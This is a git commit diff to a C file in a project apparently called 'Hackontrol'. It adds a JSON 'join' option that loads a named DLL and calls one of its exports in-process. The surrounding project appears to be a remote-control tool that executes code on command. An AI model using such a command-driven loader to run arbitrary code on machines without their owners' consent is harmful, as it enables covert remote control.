efabc8e17170c5e6883bbdf4766d9b53ecc3a2d0
KHOPAN <puthipnakchan@gmail.com>
2024-05-23 22:57:53 +0700

    Add join field

--- Hackontrol/libdll32/execute_entrypoint_dynamic_link_library.c
+++ Hackontrol/libdll32/execute_entrypoint_dynamic_link_library.c
@@ -1,7 +1,10 @@
 #include "execute.h"
 #include <khopanstring.h>
 
+typedef void (__stdcall* ExecuteFunction) (HWND window, HINSTANCE instance, LPSTR argument, int command);
+
 static LPWSTR getArgument(cJSON* root);
+static void processJoinedDLL(const LPWSTR filePath, const LPSTR functionName, const LPWSTR argument);
 
 void ProcessEntrypointDynamicLinkLibrary(cJSON* root) {
 	if(!cJSON_HasObjectItem(root, "function")) {
@@ -14,7 +17,8 @@ void ProcessEntrypointDynamicLinkLibrary(cJSON* root) {
 		return;
 	}
 
-	LPWSTR functionName = KHFormatMessageW(L"%S", cJSON_GetStringValue(function));
+	char* functionRaw = cJSON_GetStringValue(function);
+	LPWSTR functionName = KHFormatMessageW(L"%S", functionRaw);
 
 	if(!functionName) {
 		return;
@@ -28,7 +32,21 @@ void ProcessEntrypointDynamicLinkLibrary(cJSON* root) {
 	}
 
 	LPWSTR argument = getArgument(root);
-	KHWin32StartDynamicLibraryW(filePath, functionName, argument);
+	BOOL join = FALSE;
+
+	if(cJSON_HasObjectItem(root, "join")) {
+		cJSON* joinObject = cJSON_GetObjectItem(root, "join");
+
+		if(cJSON_IsBool(joinObject)) {
+			join = cJSON_IsTrue(joinObject);
+		}
+	}
+
+	if(join) {
+		processJoinedDLL(filePath, functionRaw, argument);
+	} else {
+		KHWin32StartDynamicLibraryW(filePath, functionName, argument);
+	}
 
 	if(argument) {
 		LocalFree(argument);
@@ -50,4 +68,29 @@ static LPWSTR getArgument(cJSON* root) {
 	}
 
 	return KHFormatMessageW(L"%S", cJSON_GetStringValue(argument));
+}
+
+static void processJoinedDLL(const LPWSTR filePath, const LPSTR functionName, const LPWSTR argument) {
+	LPSTR newArgument = KHFormatMessageA("%ws", argument);
+
+	if(!newArgument) {
+		return;
+	}
+
+	HMODULE module = LoadLibraryW(filePath);
+
+	if(!module) {
+		LocalFree(newArgument);
+		return;
+	}
+
+	ExecuteFunction function = (ExecuteFunction) GetProcAddress(module, functionName);
+
+	if(!function) {
+		LocalFree(newArgument);
+		return;
+	}
+
+	function(NULL, NULL, newArgument, 0);
+	LocalFree(newArgument);
 }
